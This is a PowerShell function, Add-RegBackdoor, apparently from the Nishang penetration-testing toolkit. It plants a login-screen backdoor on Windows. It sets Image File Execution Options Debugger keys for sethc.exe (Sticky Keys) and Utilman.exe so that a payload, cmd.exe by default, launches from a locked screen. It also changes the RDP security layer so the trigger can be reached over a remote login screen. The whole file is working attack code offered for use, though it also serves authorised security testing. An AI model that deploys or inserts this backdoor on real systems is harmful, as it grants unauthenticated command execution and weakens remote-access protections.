function Add-RegBackdoor
{
<#
.SYNOPSIS
Nishang Script which could set Debugger registry keys for Sticky Keys (sethc.exe) and Utilman (utilman.exe) to remotely execute commands and scripts.

.DESCRIPTION
This script can be used to set Debugger keys for  Sticky Keys (sethc.exe) and Utilman (utilman.exe). 
The payload gets executed when on a locaked machine either Shift key is pressed five times or Windows Key + U is pressed. 
The payloads can be launched remotely from RDP login screen as well if Network Level Authentication (NLA) is disabled. The script
disables NLA by modifying the registry of a target box.

The script needs to be executed from an elevated shell. 

.PARAMETER Payload
Payload which you want execute on the target. cmd.exe is the default payload.

.EXAMPLE
PS > Add-RegBackdoor
Use above command to use the default payload cmd.exe

.LINK
https://github.com/samratashok/nishang
#>
    
    
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload = "cmd.exe"
    )
    
    #Disable Network Level Authentication
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name SecurityLayer -Value 1
    
    
    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value $Payload


    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe"
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value $Payload
}

